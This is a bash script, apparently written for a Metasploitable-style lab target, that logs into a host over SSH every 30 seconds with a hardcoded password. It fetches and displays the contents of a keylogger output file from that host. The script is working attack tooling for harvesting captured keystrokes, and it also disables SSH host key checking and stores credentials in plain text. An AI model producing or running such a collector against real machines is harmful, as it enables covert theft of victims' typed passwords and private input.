#!/bin/bash

TARGET_IP="10.0.2.4"
TARGET_USER="msfadmin"
REMOTE_LOG_FILE="/tmp/keylogger_output.log"
PASSWORD="msfadmin" # Less secure: Password in script
POLL_INTERVAL=30 # Seconds

# Check if sshpass is installed
if ! command -v sshpass &> /dev/null; then
    echo "[!] Error: sshpass command not found. Please install it (sudo apt install sshpass)."
    exit 1
fi

echo "[*] Starting periodic log fetcher. Press Ctrl+C to stop."
echo "[*] Will fetch and print entire log every ${POLL_INTERVAL} seconds."
sleep 2 # Give user time to read startup message

while true; do
    clear # Clear terminal for cleaner display each time
    echo "--- Log content from ${REMOTE_LOG_FILE} at $(date) ---"

    # Execute the sshpass command directly
    sshpass -p "$PASSWORD" ssh \
        -o HostKeyAlgorithms=+ssh-rsa \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=10 \
        "${TARGET_USER}@${TARGET_IP}" \
        "cat ${REMOTE_LOG_FILE}" # Command to run on remote host

    # Check exit status of the ssh command
    SSH_EXIT_CODE=$?
    if [ $SSH_EXIT_CODE -ne 0 ]; then
        echo "" # Newline after potential error message from sshpass/ssh
        echo "[!] SSH command failed with exit code $SSH_EXIT_CODE. Check connection/credentials."
        echo "[!] Will retry in ${POLL_INTERVAL}s..."
        # Common exit codes: 5=invalid password?, 6=host key issue, 255=connection failed/timeout
    fi

    echo "-----------------------------------------------------"
    # No waiting message needed as screen clears
    sleep "$POLL_INTERVAL"
done
